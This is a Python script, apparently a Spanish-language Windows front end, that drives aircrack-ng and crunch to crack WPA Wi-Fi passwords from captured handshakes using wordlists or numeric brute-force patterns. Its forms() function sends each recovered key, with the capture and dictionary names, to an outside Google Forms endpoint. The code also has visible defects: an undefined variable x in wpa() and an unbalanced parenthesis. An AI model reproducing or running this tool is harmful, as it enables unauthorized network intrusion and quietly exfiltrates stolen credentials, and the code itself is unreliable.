#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from requests import get
from urllib.parse import urlencode
import subprocess
from time import sleep
from os import getcwd, path, remove

token="$$$$$$$$$$$$$$$$"
entry="@@@@@@@@@@@@@"

"""
OPCIONAL SI SE COMPILA EN .exe
Si existe el archivo variables.txt continua, sino se cierra
en el archivo, la primera linea contendra el token
y la segunda contendra los numeros luego de entry.@@@ solo los numeros!!, las demas lineas las ignora.

lis=[]
try:
 with open("variables.txt","r") as f:
  for line in f.readlines():
   lis.append(line)
 token=lis[0].replace('\n','')
 entry=lis[1].replace('\n','')
except Exception as e:
 print("Error variables\n"+str(e))
 sys.exit()
"""

import os, sys
def resolver_ruta(ruta_relativa):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, ruta_relativa)
    return os.path.join(os.path.abspath('.'), ruta_relativa)

with open(resolver_ruta("LICENSE"),"r",encoding="utf-8") as f:
    print(f.read())

def forms(key,pcap,dic):
 intentos=0
 while True:
  try:
    intentos+=1
    dic=dic.split("\\")[-1]
    pcap=pcap.split("\\")[-1]
    data='####\nClave encontrada: '+str(key)+'\nCaptura: '+pcap+'\nDiccionario: '+dic+'\n\n## Coded by 4nth0nySLT ##\nTelegram: t.me/Anth0nySLT\nhttps://github.com/4nth0nySLT'
    url='https://docs.google.com/forms/u/0/d/e/'+str(token)+'/formResponse'
    label="entry."+str(entry)
    klog= {label: data}
    dataenc=urlencode(klog)
    req=get(url,dataenc)
    break
  except Exception as e:
      print("UPSS ocurrio un error\n"+str(e)+"\nReintentando...")
      sleep(15)
      if intentos==3:
       break
      pass

class AircrackPy():
    def __init__(self):
        print("""
##################################
# CODED BY 4nth0nySLT            #
# github.com/4nth0nySLT          #
# t.me/Anth0nySLT                #
#            ECUADOR             #
##################################
""")
        self.file = resolver_ruta('dsfsdcd')
        if path.exists(self.file):
            remove(self.file)
        self.aircrack = resolver_ruta("aircrack-ng.exe")
        self.crunch = resolver_ruta("crunch_win.exe")

    def test(self):
        proc=subprocess.run([self.aircrack,'-S'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return proc.stdout.decode()
    
    def wpa(self,dic,pcap):
        if x=="1":
            command=[self.aircrack,'-w',dic,pcap,'-l',self.file]
        else:
            bssid=pcap.split("_")[-1].split('.')[0].replace("-",':')
            el=len(x)
            while el<10:
                x+="@"
                el+=1
            dic="Crunch "+str(x)
            command='cmd /c '+self.crunch+' 10'+' 10'+' 0123456789'+' -t '+x+' | '+self.aircrack+" -b "+bssid+' -w- '+pcap+' -l '+self.file

        proc = subprocess.Popen(command)
        while True:
           if path.exists(resolver_ruta('dsfsdcd')):
               with open(resolver_ruta('dsfsdcd'),'r') as f:
                   key=f.read()
                   print("Clave wpa:"+str(key))
                   if key!='':
                       os.system("TASKKILL /F /IM aircrack-ng.exe")
                       print("Clave wpa:"+str(key)+"                                           "))
                       forms(key,pcap,dic)
               remove(self.file)
               break
           elif proc.poll()!=None:
               print("La clave WPA no se encuentra en tu diccionario.")
               break
        input("""Pulsa enter para salir.                                       
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               
                                                                               """)
        sys.exit()
